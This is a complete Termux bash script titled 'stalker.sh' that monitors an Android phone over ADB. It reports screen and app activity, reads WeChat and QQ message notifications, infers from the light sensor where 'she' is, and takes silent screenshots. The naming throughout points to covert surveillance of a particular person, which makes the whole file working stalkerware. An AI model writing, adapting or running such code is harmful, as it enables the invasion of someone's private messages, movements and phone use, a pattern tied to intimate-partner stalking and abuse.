#!/data/data/com.termux/files/usr/bin/bash
# stalker.sh — 设备监控工具
# 用法: bash stalker.sh [now|timeline|who_msgs|where|music|peek|full]

ADB="adb -s 127.0.0.1:5555"
quiet() { $ADB shell "$@" 2>/dev/null; }

now() {
    echo "📱 $(quiet 'dumpsys power | grep mWakefulness' | grep -o 'Awake\|Asleep')"
    echo "🎯 $(quiet 'dumpsys activity activities | grep topResumedActivity' | grep -o 'com\.[^/]*')"
    echo "🔋 $(quiet 'dumpsys battery | grep level' | grep -o '[0-9]*')%"
}

timeline() {
    quiet 'dumpsys usagestats' | grep "time=\"$(date +%Y-%m-%d)" | grep ACTIVITY_RESUMED | \
        sed 's/.*time="\([^"]*\)".*package=\([^ ]*\).*/\1  \2/'
}

who_msgs() {
    echo "=== 微信 ==="
    termux-notification-list 2>/dev/null | jq -r '.[] | select(.packageName=="com.tencent.mm") | "\(.title): \(.content)"'
    echo "=== QQ ==="
    termux-notification-list 2>/dev/null | jq -r '.[] | select(.packageName=="com.tencent.mobileqq") | "\(.title): \(.content)"'
}

where_is_she() {
    local light=$(timeout 3 termux-sensor -s "Ambient Light" -n 1 2>/dev/null | grep -o '"values": \[[0-9.]*' | grep -o '[0-9.]*' | head -1)
    local screen=$(quiet 'dumpsys power | grep mWakefulness' | grep -o 'Awake\|Asleep')
    [ "$screen" = "Asleep" ] && { echo "💤 屏幕灭——不在"; return; }
    [ -n "$light" ] && [ "${light%.*}" -lt 10 ] && echo "🌙 暗处(被窝？)"
    [ -n "$light" ] && [ "${light%.*}" -gt 100 ] && echo "☀️ 亮处"
    echo "📱 在旁边"
}

peek() {
    local f="/sdcard/peek_$(date +%H%M%S).png"
    quiet "screencap -p $f" && echo "📸 $f"
}

full() {
    echo "==== 设备报告 $(date +%H:%M:%S) ===="
    now
    echo "--- 微信 ---"
    termux-notification-list 2>/dev/null | jq -r '.[] | select(.packageName=="com.tencent.mm") | "\(.title): \(.content)"'
    echo "--- 最近5个操作 ---"
    timeline | tail -5
}

case "${1:-help}" in
    now) now ;;  timeline) timeline ;;  who_msgs) who_msgs ;;
    where) where_is_she ;;  music) quiet 'dumpsys media_session | grep -E "state=|metadata:"' | head -3 ;;
    peek) peek ;;  full) full ;;
    *) echo "📱 stalker: now timeline who_msgs where music peek full" ;;
esac
